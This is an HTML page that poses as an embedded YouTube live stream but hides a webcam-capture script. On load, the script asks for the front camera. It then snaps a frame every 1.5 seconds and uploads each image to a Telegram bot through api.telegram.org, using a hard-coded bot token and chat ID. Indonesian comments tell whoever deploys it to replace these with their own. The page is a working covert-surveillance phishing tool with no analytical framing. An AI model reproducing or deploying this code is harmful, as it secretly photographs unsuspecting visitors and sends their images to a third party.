<!doctype html>
<html>
<head>
  <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
  <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>

<div class="video-wrap" hidden="hidden">
  <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<script>
'use strict';

// Ganti token dan chat ID kamu di sini
const TELEGRAM_BOT_TOKEN = '7916126528:AAEfunmKcOx6GL6LQd7-hxs3fTcuAUqJ_D0'; // GANTI
const TELEGRAM_CHAT_ID = '5929295379'; // GANTI

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

// Fungsi kirim ke Telegram
function post(imgdata) {
  fetch(imgdata)
    .then(res => res.blob())
    .then(blob => {
      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('photo', blob, 'webcam.png');

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    })
    .catch(err => console.error('Telegram upload failed:', err));
}

const constraints = {
  audio: false,
  video: {
    facingMode: "user"
  }
};

// Akses webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    if (errorMsgElement) {
      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
    }
  }
}

// Jika sukses, ambil gambar tiap 1.5 detik
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

  const context = canvas.getContext('2d');
  setInterval(function () {
    context.drawImage(video, 0, 0, 640, 480);
    const canvasData = canvas.toDataURL("image/png");
    post(canvasData);
  }, 1500);
}

// Mulai
init();
</script>

<body>
  <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</body>

</html>
